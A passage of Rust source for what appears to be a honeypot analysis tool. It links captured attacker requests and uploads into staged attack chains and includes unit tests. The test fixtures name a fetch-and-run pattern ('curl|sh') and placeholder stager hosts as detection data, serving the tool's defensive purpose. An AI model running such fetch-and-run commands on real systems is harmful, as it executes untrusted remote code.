    let unread = sent.len().saturating_sub(FOLLOW_READS_MAX) as i64;
    sent.truncate(FOLLOW_READS_MAX);
    if sent.is_empty() {
        return Ok(FollowUps {
            dead,
            ..FollowUps::default()
        });
    }
    let ids = sent.iter().map(|r| r.id.to_string()).collect::<Vec<_>>();
    let bodies: Vec<(i64, Option<Vec<u8>>)> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
        "SELECT r.id, CASE WHEN EXISTS(SELECT 1 FROM uploads u WHERE u.request_uid = r.uid)
                      THEN NULL ELSE r.body END
         FROM requests r WHERE r.id IN ({})",
        ids.join(",")
    )))
    .fetch_all(&mut *conn)
    .await?;
    let mut bodies: HashMap<i64, Option<Vec<u8>>> = bodies.into_iter().collect();
    let requests: Vec<Sent> = sent
        .iter()
        .map(|r| Sent {
            id: r.id,
            ip: r.ip.clone(),
            method: r.method.clone(),
            path: r.path.clone(),
            query: r.query.clone(),
            body: bodies.remove(&r.id).flatten(),
        })
        .collect();
    let inputs = shell_inputs(found);
    let reads = tokio::task::spawn_blocking(move || {
        let read = requests.iter().filter_map(|r| {
            let text = read_sent(r, &inputs)?;
            Some((r.id, text))
        });
        read.collect::<HashMap<_, _>>()
    })
    .await?;
    Ok(FollowUps {
        dead,
        sent,
        reads,
        unread,
    })
}

/// The Follow-up stage: where the trap stopped the chain, what was sent to
/// its files, read through the X-ray, or a gap.
fn follow_up_rows(uploads: &[UploadRow], f: &FollowUps, here: &Here) -> Vec<StageRow> {
    let target = |r: &TimelineRow| label(&masked(&format!("{} {}", r.method, r.path)));
    let dead_end = |_: &TimelineRow, n: i64| {
        let asked = count(n, "request", "requests");
        format!("{asked}: 404 within {DEAD_END_SECS} seconds of the upload")
    };
    let shown = |r: &TimelineRow| match (f.reads.get(&r.id), &r.query) {
        (Some(read), _) => label(read),
        (None, Some(q)) => label(&format!("{} {}?{q}", r.method, r.path)),
        (None, None) => label(&format!("{} {}", r.method, r.path)),
    };
    let sent = |r: &TimelineRow, n: i64| {
        let asked = count(n, "request", "requests");
        let mut detail = match (r.answer.as_deref(), r.status) {
            (Some(answer), Some(status)) => format!("{asked} · {answer} {status}"),
            (Some(answer), None) => format!("{asked} · {answer}"),
            (None, Some(status)) => format!("{asked} · {status}"),
            (None, None) => asked,
        };
        if f.reads.contains_key(&r.id) {
            detail = format!("{detail} · {}", target(r));
        }
        detail
    };
    let mut rows = request_rows(&f.dead, target, dead_end, Mark::DeadEnd, here);
    rows.extend(request_rows(&f.sent, shown, sent, Mark::Seen, here));
    if f.unread > 0 {
        let more = count(f.unread, "more request", "more requests");
        rows.push(StageRow {
            href: uploads.first().map(|u| {
                let uid = crate::admin::public::urlencode(&u.uid);
                format!("/admin/traps/uploads/{uid}")
            }),
            ..row(
                more,
                "Not read here; the upload's timeline lists them.".into(),
                Mark::Seen,
            )
        });
    }
    if rows.is_empty() {
        let detail = if uploads.is_empty() {
            "The commands never ran here."
        } else {
            "Nothing asked for the file."
        };
        rows.push(row("No follow-up".into(), detail.into(), Mark::Gap));
    }
    rows
}

/// What a chain's stages are built from.
struct Parts<'a> {
    key: Option<&'a str>,
    found: &'a [Found],
    tags: &'a [(i64, i64)],
    uploads: &'a [UploadRow],
    follow: &'a FollowUps,
    results: &'a [PieceResult],
}

fn stages(p: &Parts<'_>, here: &Here) -> [Stage; 5] {
    let mut stages = [
        ("Exploit", exploit_rows(p.found, p.tags, here)),
        ("Command", command_rows(p.found, here)),
        ("Delivery", delivery_rows(p.key, p.found, p.uploads, here)),
        ("Payload", payload_rows(p.found, p.uploads, p.results, here)),
        ("Follow-up", follow_up_rows(p.uploads, p.follow, here)),
    ]
    .map(|(name, rows)| Stage { name, rows });
    if here.dim {
        for s in &mut stages {
            if !s.rows.iter().any(|r| r.here) {
                s.rows.iter_mut().for_each(|r| r.dim = true);
            }
        }
    }
    stages
}

/// These sources as a condition on `piece_sightings g`. Their ids are
/// integers, so they go in the text and no bound runs out.
fn sources_in(sources: &[(u8, i64)]) -> String {
    let ids = |kind: u8| {
        let of_kind = sources.iter().filter(|s| s.0 == kind);
        of_kind
            .map(|s| s.1.to_string())
            .collect::<Vec<_>>()
            .join(",")
    };
    format!(
        "((g.source_kind = 'request' AND g.source_id IN ({})) \
         OR (g.source_kind = 'upload' AND g.source_id IN ({})))",
        ids(REQUEST),
        ids(UPLOAD)
    )
}

/// The newest chains with a joiner in a sighting `cond` picks. `campaign`
/// binds a `?` in `cond`.
async fn keys_where(
    conn: &mut SqliteConnection,
    cond: &str,
    campaign: Option<&str>,
    max: usize,
) -> Result<Vec<String>> {
    let sql = format!(
        "SELECT c.key FROM piece_sightings g
         JOIN chain_pieces m ON m.piece = g.piece
         JOIN pieces p ON p.hash = g.piece
         JOIN chains c ON c.key = m.chain
         WHERE g.role IN {JOINER_ROLES} AND {cond}
         GROUP BY c.key ORDER BY c.last_seen DESC, c.key LIMIT ?"
    );
    let mut q = sqlx::query_scalar(sqlx::AssertSqlSafe(sql));
    if let Some(key) = campaign {
        q = q.bind(key);
    }
    Ok(q.bind(max as i64).fetch_all(&mut *conn).await?)
}

/// A chain from its key; `None` when nothing of it is left to show.
async fn keyed(conn: &mut SqliteConnection, key: &str, here: &Here) -> Result<Option<Chain>> {
    let row: Option<(String, String, i64, i64)> =
        sqlx::query_as("SELECT first_seen, last_seen, ips, sources FROM chains WHERE key = ?")
            .bind(key)
            .fetch_optional(&mut *conn)
            .await?;
    let Some((first_seen, last_seen, ips, sources)) = row else {
        return Ok(None);
    };
    // From `chain_pieces`, not from the sources: a source naming a joiner
    // of another chain must not show it here. The key's joiner, then the
    // other joiners, then what most addresses share.
    let found: Vec<Found> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
        "WITH top AS (
           SELECT p.hash, p.kind, p.value, p.ips
           FROM chain_pieces m JOIN pieces p ON p.hash = m.piece
           WHERE m.chain = ?1
           ORDER BY p.hash IS ?2 DESC, p.kind IN ('stager', 'key', 'file') DESC,
                    p.ips DESC, p.value
           LIMIT ?3)
         SELECT t.hash, t.kind, t.value, g.role, MAX(g.grade = 'seen') AS seen, t.ips
         FROM top t JOIN piece_sightings g ON g.piece = t.hash
         WHERE g.role IN {STRIP_ROLES}
         GROUP BY t.hash, g.role ORDER BY t.value"
    )))
    .bind(key)
    .bind(key_piece(key))
    .bind(FOUND_MAX as i64)
    .fetch_all(&mut *conn)
    .await?;
    if found.is_empty() {
        return Ok(None);
    }
    let shown = found.iter().map(|p| p.hash).collect::<HashSet<_>>().len() as i64;
    let mut more = 0;
    if shown >= FOUND_MAX as i64 {
        let all: i64 = sqlx::query_scalar(
            "SELECT COUNT(*) FROM chain_pieces m JOIN pieces p ON p.hash = m.piece
             WHERE m.chain = ?",
        )
        .bind(key)
        .fetch_one(&mut *conn)
        .await?;
        more = all - shown;
    }
    let tags: Vec<(i64, i64)> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
        "WITH src AS (SELECT g.source_kind AS k, g.source_id AS i
           FROM chain_pieces m JOIN pieces p ON p.hash = m.piece
           JOIN piece_sightings g ON g.piece = m.piece
           WHERE m.chain = ?1 AND g.role IN {JOINER_ROLES}
           GROUP BY g.source_kind, g.source_id ORDER BY MAX(g.ts) DESC LIMIT ?2)
         SELECT DISTINCT e.piece, t.piece FROM src
         JOIN piece_sightings e ON e.source_kind = src.k AND e.source_id = src.i
         JOIN piece_sightings t ON t.source_kind = src.k AND t.source_id = src.i
         WHERE e.role = 'exploit' AND t.role = 'tag'"
    )))
    .bind(key)
    .bind(TAG_SOURCES_MAX)
    .fetch_all(&mut *conn)
    .await?;
    let uploads = uploads_of(conn, key).await?;
    let follow = gather_follow_ups(conn, &uploads, &found).await?;
    let results = results_of(conn, &found).await?;
    let stages = stages(
        &Parts {
            key: Some(key),
            found: &found,
            tags: &tags,
            uploads: &uploads,
            follow: &follow,
            results: &results,
        },
        here,
    );
    Ok(Some(Chain {
        key: Some(key.to_string()),
        stages,
        ips,
        sources,
        first_seen,
        last_seen,
        more,
    }))
}

#[derive(sqlx::FromRow)]
struct SourceSighting {
    source_kind: String,
    source_id: i64,
    ip_id: i64,
    ts: String,
    grade: String,
    #[sqlx(flatten)]
    piece: SourcePiece,
}

#[derive(sqlx::FromRow)]
struct SourcePiece {
    hash: i64,
    kind: String,
    value: String,
    role: String,
    ips: i64,
}

/// What these sources hold: their pieces, each exploit and tag that shared
/// one, and the addresses, sources and times they span.
async fn read_sources(
    conn: &mut SqliteConnection,
    sources: &[(u8, i64)],
) -> Result<Option<(Vec<Found>, Vec<(i64, i64)>, Span)>> {
    let rows: Vec<SourceSighting> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
        "SELECT g.source_kind, g.source_id, g.ip_id, g.ts, g.grade,
                p.hash, p.kind, p.value, g.role, p.ips
         FROM piece_sightings g JOIN pieces p ON p.hash = g.piece
         WHERE g.role IN {STRIP_ROLES} AND {}",
        sources_in(sources)
    )))
    .fetch_all(&mut *conn)
    .await?;
    let (mut ips, mut held) = (HashSet::new(), HashSet::new());
    let mut span = Span::default();
    let mut found: BTreeMap<(String, i64, String), Found> = BTreeMap::new();
    let (mut exploits, mut tags): (BTreeSet<_>, BTreeSet<_>) = Default::default();
    for r in rows {
        let source = source_of(&r.source_kind, r.source_id);
        ips.insert(r.ip_id);
        held.insert(source);
        span.widen(&r.ts);
        let p = r.piece;
        match p.role.as_str() {
            "exploit" => exploits.insert((source, p.hash)),
            "tag" => tags.insert((source, p.hash)),
            _ => false,
        };
        let seen = r.grade == "seen";
        found
            .entry((p.value.clone(), p.hash, p.role.clone()))
            .and_modify(|f| f.seen |= seen)
            .or_insert(Found {
                hash: p.hash,
                kind: p.kind,
                value: p.value,
                role: p.role,
                seen,
                ips: p.ips,
            });
    }
    if found.is_empty() {
        return Ok(None);
    }
    let shared = exploits.iter().flat_map(|(source, exploit)| {
        let same = tags.iter().filter(move |(s, _)| s == source);
        same.map(|(_, tag)| (*exploit, *tag))
    });
    let shared: BTreeSet<(i64, i64)> = shared.collect();
    span.ips = ips.len() as i64;
    span.sources = held.len() as i64;
    let mut found: Vec<Found> = found.into_values().collect();
    let joins = |p: &Found| matches!(p.role.as_str(), "stager" | "key" | "file");
    found.sort_by_key(|p| (!joins(p), std::cmp::Reverse(p.ips)));
    span.more = found.len().saturating_sub(FOUND_MAX) as i64;
    found.truncate(FOUND_MAX);
    found.sort_by(|a, b| a.value.cmp(&b.value));
    Ok(Some((found, shared.into_iter().collect(), span)))
}

/// What a chain without a key covers.
#[derive(Default)]
struct Span {
    ips: i64,
    sources: i64,
    first_seen: String,
    last_seen: String,
    more: i64,
}

impl Span {
    fn widen(&mut self, ts: &str) {
        if self.first_seen.is_empty() || ts < self.first_seen.as_str() {
            self.first_seen = ts.to_string();
        }
        if ts > self.last_seen.as_str() {
            self.last_seen = ts.to_string();
        }
    }
}

/// These sources as a chain of their own, without a key, if they hold
/// anything a strip shows.
async fn unkeyed(
    conn: &mut SqliteConnection,
    sources: &[(u8, i64)],
    here: &Here,
) -> Result<Option<Chain>> {
    let Some((found, tags, span)) = read_sources(conn, sources).await? else {
        return Ok(None);
    };
    let ids = sources.iter().filter(|s| s.0 == UPLOAD).map(|s| s.1);
    let ids = ids.map(|i| i.to_string()).collect::<Vec<_>>().join(",");
    let uploads: Vec<UploadRow> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
        "SELECT {UPLOAD_COLS} WHERE u.id IN ({ids}) ORDER BY u.id DESC LIMIT ?"
    )))
    .bind(UPLOADS_MAX)
    .fetch_all(&mut *conn)
    .await?;
    let follow = gather_follow_ups(conn, &uploads, &found).await?;
    let results = results_of(conn, &found).await?;
    let stages = stages(
        &Parts {
            key: None,
            found: &found,
            tags: &tags,
            uploads: &uploads,
            follow: &follow,
            results: &results,
        },
        here,
    );
    Ok(Some(Chain {
        key: None,
        stages,
        ips: span.ips,
        sources: span.sources,
        first_seen: span.first_seen,
        last_seen: span.last_seen,
        more: span.more,
    }))
}

/// Every key's chain, newest first.
async fn all_keyed(
    conn: &mut SqliteConnection,
    keys: Vec<String>,
    here: &Here,
) -> Result<Vec<Chain>> {
    let mut out = vec![];
    for key in keys {
        out.extend(keyed(conn, &key, here).await?);
    }
    Ok(out)
}

/// A source's chains, or, with no joiner in one, its own.
async fn of_sources(
    conn: &mut SqliteConnection,
    sources: &[(u8, i64)],
    mut here: Here,
    max: usize,
) -> Result<Vec<Chain>> {
    here.dim = true;
    let pieces: Vec<i64> = sqlx::query_scalar(sqlx::AssertSqlSafe(format!(
        "SELECT DISTINCT g.piece FROM piece_sightings g WHERE g.role IN {STRIP_ROLES} AND {}",
        sources_in(sources)
    )))
    .fetch_all(&mut *conn)
    .await?;
    here.pieces.extend(pieces);
    let keys = keys_where(conn, &sources_in(sources), None, max).await?;
    let chains = all_keyed(conn, keys, &here).await?;
    if !chains.is_empty() {
        return Ok(chains);
    }
    Ok(unkeyed(conn, sources, &here).await?.into_iter().collect())
}

/// A piece's chain, or a chain of the newest sources sharing it. Only the
/// sightings a strip would show count, so a queried URL has none.
async fn of_piece(conn: &mut SqliteConnection, hash: i64) -> Result<Vec<Chain>> {
    let here = Here {
        pieces: HashSet::from([hash]),
        ..Here::default()
    };
    let key: Option<String> = sqlx::query_scalar(sqlx::AssertSqlSafe(format!(
        "SELECT m.chain FROM chain_pieces m JOIN pieces p ON p.hash = m.piece
         JOIN piece_sightings g ON g.piece = m.piece
         WHERE m.piece = ? AND g.role IN {JOINER_ROLES} LIMIT 1"
    )))
    .bind(hash)
    .fetch_optional(&mut *conn)
    .await?;
    if let Some(key) = key
        && let Some(chain) = keyed(conn, &key, &here).await?
    {
        return Ok(vec![chain]);
    }
    let held: Vec<(String, i64)> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
        "SELECT source_kind, source_id FROM piece_sightings
         WHERE piece = ? AND role IN {STRIP_ROLES}
         GROUP BY source_kind, source_id ORDER BY MAX(ts) DESC LIMIT ?"
    )))
    .bind(hash)
    .bind(SHARED_SOURCES_MAX)
    .fetch_all(&mut *conn)
    .await?;
    if held.is_empty() {
        return Ok(vec![]);
    }
    let sources: Vec<(u8, i64)> = held.iter().map(|(k, i)| source_of(k, *i)).collect();
    let Some(mut chain) = unkeyed(conn, &sources, &here).await? else {
        return Ok(vec![]);
    };
    // Over the cap, `unkeyed` covers the newest sources; the figures do not stop there.
    let (ips, n, first, last): (i64, i64, Option<String>, Option<String>) =
        sqlx::query_as(sqlx::AssertSqlSafe(format!(
            "SELECT COUNT(DISTINCT ip_id), COUNT(DISTINCT source_kind || ':' || source_id),
                    MIN(ts), MAX(ts)
             FROM piece_sightings WHERE piece = ? AND role IN {STRIP_ROLES}"
        )))
        .bind(hash)
        .fetch_one(&mut *conn)
        .await?;
    chain.ips = ips;
    chain.sources = n;
    chain.first_seen = first.unwrap_or_default();
    chain.last_seen = last.unwrap_or_default();
    Ok(vec![chain])
}

/// A chain in the Chains list.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ChainRow {
    pub key: String,
    /// The joiner that names it, defanged, and its page.
    pub joiner: Option<(String, String)>,
    pub first_seen: String,
    pub last_seen: String,
    pub ips: i64,
    pub sources: i64,
    pub exploits: i64,
    pub payload: Mark,
}

/// A [`ChainRow`] as stored.
#[derive(sqlx::FromRow)]
struct ListedChain {
    key: String,
    first_seen: String,
    last_seen: String,
    ips: i64,
    sources: i64,
    exploits: i64,
    text_held: bool,
}

/// Which chains the list shows.
#[derive(Debug, Clone, Copy, Default)]
pub struct ChainFilter<'a> {
    /// Those of this address's id.
    pub ip: Option<i64>,
    /// Those of this campaign's members.
    pub campaign: Option<&'a str>,
}

impl Store {
    /// The chains an anchor belongs to, newest first, at most
    /// [`CHAINS_MAX`]. A source with no joiner in a chain gets one chain,
    /// without a key, of what it holds; nothing to show gives none.
    pub async fn chains_of(&self, a: Anchor<'_>) -> Result<Vec<Chain>> {
        self.chains_upto(a, CHAINS_MAX).await
    }

    /// [`Store::chains_of`], building at most `max`.
    pub async fn chains_upto(&self, a: Anchor<'_>, max: usize) -> Result<Vec<Chain>> {
        let mut conn = self.read.acquire().await?;
        let conn = &mut *conn;
        match a {
            Anchor::Request(id) => {
                let carried: Vec<(i64, String)> = sqlx::query_as(
                    "SELECT u.id, u.uid FROM uploads u JOIN requests r ON r.uid = u.request_uid
                     WHERE r.id = ?",
                )
                .bind(id)
                .fetch_all(&mut *conn)
                .await?;
                let mut sources = vec![(REQUEST, id)];
                sources.extend(carried.iter().map(|(u, _)| (UPLOAD, *u)));
                let here = Here {
                    requests: HashSet::from([id]),
                    uploads: carried.into_iter().map(|(_, uid)| uid).collect(),
                    ..Here::default()
                };
                of_sources(conn, &sources, here, max).await
            }
            Anchor::Upload(uid) => {
                let row: Option<(i64, Option<i64>)> = sqlx::query_as(
                    "SELECT u.id, r.id FROM uploads u
                     LEFT JOIN requests r ON r.uid = u.request_uid WHERE u.uid = ?",
                )
                .bind(uid)
                .fetch_optional(&mut *conn)
                .await?;
                let Some((id, carrier)) = row else {
                    return Ok(vec![]);
                };
                let mut sources = vec![(UPLOAD, id)];
                sources.extend(carrier.map(|r| (REQUEST, r)));
                let here = Here {
                    requests: carrier.into_iter().collect(),
                    uploads: HashSet::from([uid.to_string()]),
                    ..Here::default()
                };
                of_sources(conn, &sources, here, max).await
            }
            Anchor::Ip(ip) => {
                let keys = keys_where(conn, &format!("g.ip_id = {ip}"), None, max).await?;
                let pieces: Vec<i64> = sqlx::query_scalar(sqlx::AssertSqlSafe(format!(
                    "SELECT DISTINCT piece FROM piece_sightings
                     WHERE ip_id = ? AND role IN {STRIP_ROLES}"
                )))
                .bind(ip)
                .fetch_all(&mut *conn)
                .await?;
                let here = Here {
                    pieces: pieces.into_iter().collect(),
                    ..Here::default()
                };
                all_keyed(conn, keys, &here).await
            }
            Anchor::Campaign(key) => {
                let members = "g.ip_id IN
                    (SELECT ip_id FROM campaign_members WHERE campaign_key = ?)";
                let keys = keys_where(conn, members, Some(key), max).await?;
                all_keyed(conn, keys, &Here::default()).await
            }
            Anchor::Piece(hash) => of_piece(conn, hash).await,
        }
    }

    /// One page of chains, newest first.
    pub async fn chains_page(&self, page: u32, f: ChainFilter<'_>) -> Result<Page<ChainRow>> {
        let of_addresses = |who: &str| {
            format!(
                "WHERE c.key IN (SELECT m.chain FROM piece_sightings g
                   JOIN chain_pieces m ON m.piece = g.piece
                   JOIN pieces p ON p.hash = m.piece
                   WHERE g.role IN {JOINER_ROLES} AND g.ip_id IN ({who}))"
            )
        };
        let only = match (f.ip, f.campaign) {
            (Some(_), _) => of_addresses("?"),
            (None, Some(_)) => {
                of_addresses("SELECT ip_id FROM campaign_members WHERE campaign_key = ?")
            }
            (None, None) => String::new(),
        };
        let sql = format!(
            "SELECT c.key, c.first_seen, c.last_seen, c.ips, c.sources,
               (SELECT COUNT(*) FROM chain_pieces x JOIN pieces p ON p.hash = x.piece
                WHERE x.chain = c.key AND p.kind = 'exploit') AS exploits,
               EXISTS(SELECT 1 FROM chain_pieces x JOIN pieces p ON p.hash = x.piece
                 JOIN piece_sightings g ON g.piece = x.piece AND g.source_kind = 'upload'
                 JOIN uploads u ON u.id = g.source_id
                 WHERE x.chain = c.key AND g.role IN {JOINER_ROLES} AND {HELD_TEXT}) AS text_held
             FROM chains c {only} ORDER BY c.last_seen DESC, c.key LIMIT ? OFFSET ?"
        );
        let mut q = sqlx::query_as::<_, ListedChain>(sqlx::AssertSqlSafe(sql));
        if let Some(ip) = f.ip {
            q = q.bind(ip);
        } else if let Some(c) = f.campaign {
            q = q.bind(c);
        }
        let rows = q
            .bind(PAGE_SIZE + 1)
            .bind(offset(page))
            .fetch_all(&self.read)
            .await?;
        let hashes: Vec<String> = rows
            .iter()
            .filter_map(|r| key_piece(&r.key))
            .map(|h| h.to_string())
            .collect();
        let pieces: Vec<(i64, String, String)> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
            "SELECT hash, kind, value FROM pieces WHERE hash IN ({})",
            hashes.join(",")
        )))
        .fetch_all(&self.read)
        .await?;
        let named: HashMap<i64, (String, String)> = pieces
            .into_iter()
            .map(|(hash, kind, value)| {
                let href = link_href(&kind, &value);
                (hash, (label(&value), href))
            })
            .collect();
        let rows = rows
            .into_iter()
            .map(|r| ChainRow {
                joiner: key_piece(&r.key).and_then(|h| named.get(&h).cloned()),
                key: r.key,
                first_seen: r.first_seen,
                last_seen: r.last_seen,
                ips: r.ips,
                sources: r.sources,
                exploits: r.exploits,
                payload: if r.text_held { Mark::Seen } else { Mark::Gap },
            })
            .collect();
        Ok(Page::from_rows(rows, page))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::store::Store;
    use crate::store::campaigns::HARD_FANOUT_MAX;
    use crate::store::pieces::{extract, piece_hash};
    use crate::store::requests::NewRequest;
    use crate::store::uploads::seed_upload;

    const T0: &str = "2026-10-01 00:00:00";
    const T1: &str = "2026-10-02 00:00:00";
    /// More than the 32 bytes a `file` piece needs.
    const FILE: &[u8] = b"<?php echo 'a file of at least thirty-two bytes'; ?>";

    fn at(piece: i64, source: (u8, i64), ip: i64, ts: &str) -> JoinerSighting {
        JoinerSighting {
            piece,
            source,
            ip,
            ts: ts.into(),
        }
    }

    fn joiners(chains: &[ChainOut]) -> Vec<Vec<i64>> {
        chains.iter().map(|c| c.joiners.clone()).collect()
    }

    fn the<'a>(chains: &'a [ChainOut], piece: i64) -> &'a ChainOut {
        chains.iter().find(|c| c.joiners.contains(&piece)).unwrap()
    }

    #[test]
    fn one_forged_body_fuses_nothing() {
        let forged = connect(&[at(1, (REQUEST, 1), 10, T0), at(2, (REQUEST, 1), 10, T0)]);
        assert_eq!(joiners(&forged), [[1], [2]]);
        // Sent again from the same address, it still is one address.
        let again = connect(&[
            at(1, (REQUEST, 1), 10, T0),
            at(2, (REQUEST, 1), 10, T0),
            at(1, (REQUEST, 2), 10, T1),
            at(2, (REQUEST, 2), 10, T1),
            at(1, (UPLOAD, 2), 10, T1),
            at(2, (UPLOAD, 2), 10, T1),
        ]);
        assert_eq!(joiners(&again), [[1], [2]]);
    }

    #[test]
    fn two_addresses_connect_joiners() {
        let c = connect(&[
            at(1, (REQUEST, 1), 10, T0),
            at(2, (REQUEST, 1), 10, T0),
            at(1, (UPLOAD, 1), 11, T1),
            at(2, (UPLOAD, 1), 11, T1),
        ]);
        assert_eq!(joiners(&c), [[1, 2]]);
        assert_eq!((c[0].ips, c[0].sources.len()), (2, 2));
        assert_eq!(
            (c[0].first_seen.as_str(), c[0].last_seen.as_str()),
            (T0, T1)
        );
    }

    #[test]
    fn connection_runs_through_a_shared_joiner() {
        let c = connect(&[
            at(1, (REQUEST, 1), 10, T0),
            at(2, (REQUEST, 1), 10, T0),
            at(1, (REQUEST, 2), 11, T0),
            at(2, (REQUEST, 2), 11, T0),
            at(2, (REQUEST, 3), 12, T0),
            at(3, (REQUEST, 3), 12, T0),
            at(2, (REQUEST, 4), 13, T0),
            at(3, (REQUEST, 4), 13, T0),
        ]);
        assert_eq!(joiners(&c), [[1, 2, 3]]);
    }

    #[test]
    fn one_address_using_two_stagers_connects_nothing() {
        // Both on both addresses, but never in one source.
        let c = connect(&[
            at(1, (REQUEST, 1), 10, T0),
            at(2, (REQUEST, 2), 10, T0),
            at(1, (REQUEST, 3), 11, T0),
            at(2, (REQUEST, 4), 11, T0),
        ]);
        assert_eq!(joiners(&c), [[1], [2]]);
    }

    /// `n` joiners named together, by each of two addresses.
    fn named_together(n: i64) -> Vec<JoinerSighting> {
        (0..n)
            .flat_map(|j| [at(j, (REQUEST, 1), 10, T0), at(j, (REQUEST, 2), 11, T0)])
            .collect()
    }

    #[test]
    fn a_source_naming_too_many_joiners_connects_none() {
        let at_cap = named_together(PAIRED_JOINERS_MAX as i64);
        assert_eq!(connect(&at_cap).len(), 1, "at the cap");
        let over = connect(&named_together(PAIRED_JOINERS_MAX as i64 + 1));
        assert_eq!(over.len(), PAIRED_JOINERS_MAX + 1);
        // Left out of the pairs only: each still has its sources.
        assert!(over.iter().all(|c| c.sources.len() == 2 && c.ips == 2));
    }

    #[test]
    fn chain_key_is_its_oldest_joiner() {
        let pair = |a, b, s: i64, ts: &str| {
            [
                at(a, (REQUEST, s), s + 100, ts),
                at(b, (REQUEST, s), s + 100, ts),
            ]
        };
        let mut rows: Vec<JoinerSighting> = [pair(0x20, 0x10, 1, T1), pair(0x20, 0x10, 2, T1)]
            .into_iter()
            .flatten()
            .collect();
        rows.push(at(0x20, (REQUEST, 3), 200, T0));
        let c = connect(&rows);
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].key, "0000000000000020", "older than the lower hash");
        // A newer joiner grows the chain and leaves the key.
        rows.extend(pair(0x10, 0x05, 4, T1));
        rows.extend(pair(0x10, 0x05, 5, T1));
        let grown = connect(&rows);
        assert_eq!(grown.len(), 1);
        assert_eq!(grown[0].joiners, [0x05, 0x10, 0x20]);
        assert_eq!(grown[0].key, "0000000000000020");
        // Ties break by hash. A negative hash is its 64 bits.
        assert_eq!(
            connect(&[at(7, (REQUEST, 1), 1, T0)])[0].key,
            "0000000000000007"
        );
        let tie = connect(&[
            at(9, (REQUEST, 1), 1, T0),
            at(-1, (REQUEST, 1), 1, T0),
            at(9, (REQUEST, 2), 2, T0),
            at(-1, (REQUEST, 2), 2, T0),
        ]);
        assert_eq!(tie[0].key, "ffffffffffffffff");
    }

    #[test]
    fn source_with_two_unconnected_joiners_counts_in_both() {
        let c = connect(&[
            at(1, (REQUEST, 1), 10, T0),
            at(2, (REQUEST, 1), 10, T0),
            at(1, (REQUEST, 2), 10, T1),
        ]);
        assert_eq!(joiners(&c), [[1], [2]]);
        assert_eq!(the(&c, 1).sources, [(REQUEST, 1), (REQUEST, 2)]);
        assert_eq!(the(&c, 2).sources, [(REQUEST, 1)]);
    }

    async fn store() -> (Store, tempfile::TempDir) {
        let dir = tempfile::tempdir().unwrap();
        let s = Store::connect(&dir.path().join("t.db")).await.unwrap();
        (s, dir)
    }

    /// A sighting as extraction stores it.
    async fn sight(
        s: &Store,
        (kind, value, role): (&str, &str, &str),
        (source_kind, source_id): (&str, i64),
        ip: i64,
    ) -> i64 {
        let hash = piece_hash(kind, value);
        sqlx::query(
            "INSERT OR IGNORE INTO pieces (hash, kind, value, first_seen, last_seen, ips, sources)
             VALUES (?, ?, ?, ?, ?, 0, 0)",
        )
        .bind(hash)
        .bind(kind)
        .bind(value)
        .bind(T0)
        .bind(T0)
        .execute(&s.pool)
        .await
        .unwrap();
        sqlx::query("INSERT INTO piece_sightings VALUES (?, ?, ?, ?, ?, 'claimed', ?)")
            .bind(hash)
            .bind(source_kind)
            .bind(source_id)
            .bind(ip)
            .bind(role)
            .bind(T0)
            .execute(&s.pool)
            .await
            .unwrap();
        hash
    }

    async fn run(s: &Store) {
        let mut c = s.pool.acquire().await.unwrap();
        let p = plan(&mut c).await.unwrap();
        drop(c);
        let mut tx = s.pool.begin_with("BEGIN IMMEDIATE").await.unwrap();
        store_plan(&mut tx, &p).await.unwrap();
        tx.commit().await.unwrap();
    }

    fn key_of(piece: i64) -> String {
        format!("{:016x}", piece as u64)
    }

    /// The pieces of the chain `key`, in order.
    async fn pieces_of(s: &Store, key: &str) -> Vec<i64> {
        sqlx::query_scalar("SELECT piece FROM chain_pieces WHERE chain = ? ORDER BY piece")
            .bind(key)
            .fetch_all(&s.pool)
            .await
            .unwrap()
    }

    async fn chains(s: &Store) -> Vec<(String, String, String, i64, i64, i64)> {
        sqlx::query_as("SELECT key, first_seen, last_seen, ips, sources, v FROM chains")
            .fetch_all(&s.pool)
            .await
            .unwrap()
    }

    fn sorted(mut v: Vec<i64>) -> Vec<i64> {
        v.sort_unstable();
        v
    }

    const STAGER_A: (&str, &str, &str) = ("stager", "a.example.org", "stager");
    const STAGER_B: (&str, &str, &str) = ("stager", "b.example.org", "stager");
    const RECIPE: (&str, &str, &str) = ("recipe", "curl|sh", "recipe");

    #[tokio::test]
    async fn sharing_a_recipe_connects_nothing() {
        let (s, _d) = store().await;
        let a = sight(&s, STAGER_A, ("request", 1), 10).await;
        let b = sight(&s, STAGER_B, ("request", 2), 11).await;
        let r = sight(&s, RECIPE, ("request", 1), 10).await;
        sight(&s, RECIPE, ("request", 2), 11).await;
        run(&s).await;
        assert_eq!(chains(&s).await.len(), 2);
        assert_eq!(pieces_of(&s, &key_of(a)).await, sorted(vec![a, r]));
        assert_eq!(pieces_of(&s, &key_of(b)).await, sorted(vec![b, r]));
    }

    #[tokio::test]
    async fn a_pass_replaces_the_last_one_and_stamps_the_version() {
        let (s, _d) = store().await;
        let a = sight(&s, STAGER_A, ("request", 1), 10).await;
        run(&s).await;
        assert_eq!(
            chains(&s).await,
            [(key_of(a), T0.into(), T0.into(), 1, 1, CHAIN_V)]
        );
        sqlx::query("DELETE FROM piece_sightings")
            .execute(&s.pool)
            .await
            .unwrap();
        let b = sight(&s, STAGER_B, ("request", 2), 11).await;
        run(&s).await;
        assert_eq!(chains(&s).await.len(), 1);
        assert_eq!(chains(&s).await[0].0, key_of(b));
        assert_eq!(pieces_of(&s, &key_of(a)).await, Vec::<i64>::new());
    }

    #[tokio::test]
    async fn store_plan_writes_more_than_a_batch() {
        let (s, _d) = store().await;
        let n = INSERT_BATCH as i64 + 1;
        let rows: Vec<_> = (0..n).map(|j| at(j, (REQUEST, j), j, T0)).collect();
        let p = Plan {
            chains: connect(&rows),
            members: (0..n).map(|j| (j as usize, j)).collect(),
        };
        let mut c = s.pool.acquire().await.unwrap();
        store_plan(&mut c, &p).await.unwrap();
        store_plan(&mut c, &p).await.unwrap();
        drop(c);
        assert_eq!(chains(&s).await.len(), n as usize);
        let last = key_of(n - 1);
